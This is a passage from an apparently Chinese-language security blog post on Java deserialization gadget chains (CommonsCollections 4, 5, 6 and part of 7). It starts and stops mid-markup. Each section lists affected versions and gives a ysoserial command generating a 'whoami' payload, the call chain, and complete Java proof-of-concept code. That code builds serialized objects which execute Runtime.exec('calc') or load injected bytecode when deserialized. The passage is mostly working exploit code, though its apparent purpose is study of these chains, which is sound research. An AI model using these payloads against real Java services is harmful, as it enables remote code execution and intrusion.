class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesimpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C:\\Users\\86151\\hexo-blog\\source\\_posts\\ysoserial\\ysoserial\\target\\classes\\Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;;<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        SetFieldValue(templatesimpl,<span class="hljs-string">&quot;_transletIndex&quot;</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templatesimpl&#125;);<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br>        SetFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>        String s= serialize(priorityQueue);<br>        deserialize(s);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当然也可以不采用加载字节码改成反射调用Runtime</p><h3 id="commonscollections-5"><a class="markdownIt-Anchor" href="#commonscollections-5"></a> CommonsCollections 5</h3><p>影响版本：jdk无限制，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">badAttributeValueExpException</span>.readObject-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.toString-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.getValue-&gt;</span>CC1中的LazyMap链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; Lazymap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap, <span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        SetFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span>serialize(badAttributeValueExpException);<br>        deserialize(s);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">SetFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="commonscollections-6"><a class="markdownIt-Anchor" href="#commonscollections-6"></a> CommonsCollections 6</h3><p>影响版本：jdk无限制，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections6 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashMap</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashMap</span>.hash-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.hashCode-&gt;</span>T<span class="hljs-function"><span class="hljs-title">iedMapEntry</span>.getValue-&gt;</span>CC1中的LazyMap链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; Lazymap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(Lazymap,<span class="hljs-string">&quot;aa&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;bb&quot;</span>);<br>        Lazymap.remove(<span class="hljs-string">&quot;aa&quot;</span>);<br>        Class c=LazyMap.class;<br>        Field factoryfield=c.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryfield.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryfield.set(Lazymap,chainedTransformer);<br>        String s=serialize(hashMap);<br>        deserialize(s);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(baos.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">deserialize</span><span class="hljs-params">(String data)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(data));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="commonscollections-7"><a class="markdownIt-Anchor" href="#commonscollections-7"></a> CommonsCollections 7</h3><p>影响版本：jdk无限制，CommonsCollections 3.1 - 3.2.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections7 <span class="hljs-string">&quot;whoami&quot;</span> |<span class="hljs-built_in">base64</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl">H<span class="hljs-function"><span class="hljs-title">ashtable</span>.readObject-&gt;</span>H<span class="hljs-function"><span class="hljs-title">ashtable</span>.reconstitutionPut-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractMapDecorator</span>.equals-&gt;</span>A<span class="hljs-function"><span class="hljs-title">bstractMap</span>.equals-&gt;</span>CC1中的LazyMap链<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] Transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>       <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap1</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap1, chainedTransformer);<br>        lazyMap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap2</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap2, chainedTransformer);<br>        lazyMap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<span class="hljs-comment">//这里的键值对不能改，需要满足hash碰撞</span><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazyMap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazyMap2, <span class="hljs-number">2</span>);<br>        SetFieldValue(chainedTransformer,<span class="hljs-string">&quot;iTransformers&quot;</span>,Transformers);<br>        lazyMap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br>        String s=serialize(hashtable);<br>        deserialize(s);<br><br>    &#125;<br>    <span 